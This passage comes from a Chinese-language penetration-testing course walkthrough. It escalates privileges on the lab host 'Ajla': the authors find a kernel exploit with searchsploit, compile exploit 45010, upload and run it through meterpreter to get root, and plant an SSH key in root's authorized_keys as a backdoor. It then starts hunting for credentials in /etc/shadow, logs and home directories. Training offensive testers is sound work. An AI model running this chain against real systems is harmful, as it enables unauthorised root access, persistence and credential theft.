
x86_64 GNU/Linux

```
Listing 921 - 在 Aja 上运行 uname
```

既然我们有了内核版本，我们将返回 `searchsploit`。

```text
kali@kali:~$ searchsploit ubuntu 16.04

Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PA | exploits/linux/x86-64/local/

Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - 'Netfilter ta | exploits/linux/x86-64/local/

Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x8 | exploits/linux/local/41770.c

Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fput()' bp | exploits/linux/local/39772.t

Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6T_SO_SET_REPL | exploits/linux/local/40489.t

Linux Kernel 4.8 (Ubuntu 16.04) - Leak scfp Kernel Poin | exploits/linux/dos/45919.c

Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Loca | exploits/linux/local/45010.c

Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privi | exploits/linux/local/44298.c

...
```

Listing 922 - 搜索 ubuntu 16.04 漏洞利用程序

虽然其中许多看起来可能有效，但其中一个特别引起了我们的注意。在审查了漏洞利用程序 `45010` 的源代码[^1] 后，我们发现它编写精良，针对多个不同的内核版本进行了测试，并且具有出色的编译和执行说明。首先，让我们查明 Ajla 是否有 `gcc`。

> 对于漏洞利用程序来说，内核版本并不总是必须完全匹配才能工作。在这种情况下，该漏洞利用程序是在内核 4.13.9 上测试的，这比 Ajla 上的内核更新。

```text
gcc
/bin/sh: 1: gcc: not found

find / -name gcc -type f 2>/dev/null

/usr/share/bash-completion/completions/gcc
```

Listing 923 - 尝试在 Ajla 上定位 GCC

不幸的是，Ajla 没有安装 `gcc` 二进制文件，因此我们需要在 Kali 机器上编译漏洞利用程序，将其传输到 Ajla，并希望它仍然有效。或者，如有必要，我们还可以创建一个与我们目标系统在操作系统和内核版本上相同的虚拟机，并在其上编译漏洞利用程序。

[^1]: (Offensive Security, 2020), https://www.exploit-db.com/exploits/45010

#### 24.4.2 权限提升

首先，我们将漏洞利用程序复制到我们的 `home` 目录，以免更改原始版本。复制完成后，我们将按照文件中的编译说明进行操作。

```text
kali@kali:~$ cp /usr/share/exploitdb/exploits/linux/local/45010.c ./
kali@kali:~$ gcc 45010.c -o 45010
kali@kali:~$
```

Listing 924 - 编译漏洞利用程序

漏洞利用程序编译没有错误，因此我们将使用 meterpreter 将其上传到 Ajla。

```text
meterpreter > upload /home/kali/45010 /tmp/
[*] uploading   : /home/kali/45010 -> /tmp/
[*] uploaded    : /home/kali/45010 -> /tmp/45010
```

Listing 925 - 上传漏洞利用程序

最后，是时候对 Ajla 运行漏洞利用程序了。

```text
meterpreter > shell
Process 1546 created.
Channel 5 created.
cd /tmp
chmod +x 45010
./45010
whoami
root
```

Listing 926 - 运行漏洞利用程序

在 Listing 926 中，漏洞利用程序没有给出任何输出，但运行 `whoami` 告诉我们现在是以 root 用户身份运行。既然我们获得了 root 访问权限，我们可以使用 `ssh` 创建一个更稳定的后门。这将允许我们在 meterpreter 会话死亡时返回 Ajla。

首先，我们需要在 Kali 机器上生成一个新的 ssh 密钥。

*如果你已经生成了 ssh 密钥，可以跳过此步骤。*

```text
kali@kali:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/kali/.ssh/id_rsa.
Your public key has been saved in /home/kali/.ssh/id_rsa.pub.
...
kali@kali:~$ cat ~/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAAADAQABAAAAbQD... kali@kali
```

Listing 927 - 在 Kali 上生成 SSH 密钥

生成了我们的 ssh 密钥后，我们可以在 Ajla 上创建 `authorized_keys` 文件以接受我们的公钥。我们将通过拥有 root shell 的 meterpreter 会话执行此操作。

```text
mkdir /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAAADAQABAAAAbQD... kali@kali" > /root/.ssh/authorized_keys
```

Listing 928 - 将公钥添加到 /root/.ssh/authorized_keys 文件

现在在 Kali 上，我们可以使用 ssh 客户端直接连接到 Ajla。

```text
kali@kali:~$ ssh root@sandbox.local
Welcome to Ubuntu 16.04 LTS (GNU/Linux 4.4.0-21-generic x86_64)
...
root@ajla:~#
```

Listing 929 - 使用 ssh 登录到 Ajla

### 24.4.3 搜索数据库凭据

在寻找凭据时，我们必须像管理员或开发人员那样思考。你会在哪里存储凭据？凭据是如何使用的？是否有历史记录或日志文件可能意外保存了凭据？

一个例子是，如果服务器用户在用户名字段中错误地输入了密码，这可能会被记录在 `/var/log/auth.log` 中。让我们像管理员一样思考，查看可能包含用户信息的位置。

我们首先查看 `/etc/passwd`、`/etc/group` 和 `/etc/shadow`，以了解有多少用户和组可以访问目标系统。

然而，我们获得的唯一有用信息是存在一个名为 "ajla" 的用户。让我们检查用户的家目录，看看我们能找到什么。

```text
root@ajla:~# cd /home/ajla
root@ajla:/home/ajla# ls -alh
total 32K
drwxr-xr-x 3 ajla ajla 4.0K Dec 10 16:37 .
drwxr-xr-x 3 root root 4.0K Dec 10 16:22 ..
-rw------- 1 ajla ajla   15 Dec 10 16:40 .bash_history
-rw-r--r-- 1 ajla ajla  220 Oct 15 17:49 .bash_logout
-rw-r--r-- 1 ajla ajla 3.7K Oct 15 17:49 .bashrc
drwx------ 2 ajla ajla 4.0K Oct 15 17:52 .cache
-rw-r--r-- 1 ajla ajla  675 Oct 15 17:49 .profile
```
